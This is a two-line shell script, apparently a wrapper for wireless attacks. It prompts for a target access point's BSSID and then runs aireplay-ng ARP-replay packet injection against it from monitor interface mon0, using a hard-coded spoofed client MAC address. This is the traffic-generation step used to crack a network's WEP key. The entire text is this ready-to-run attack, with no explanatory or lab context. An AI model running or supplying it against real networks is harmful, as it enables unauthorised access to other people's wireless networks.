echo Enter target's bssid
read bssid

aireplay-ng -3 -b $bssid -h 00:c0:ca:6c:9c:0c mon0 --ignore-negative-one
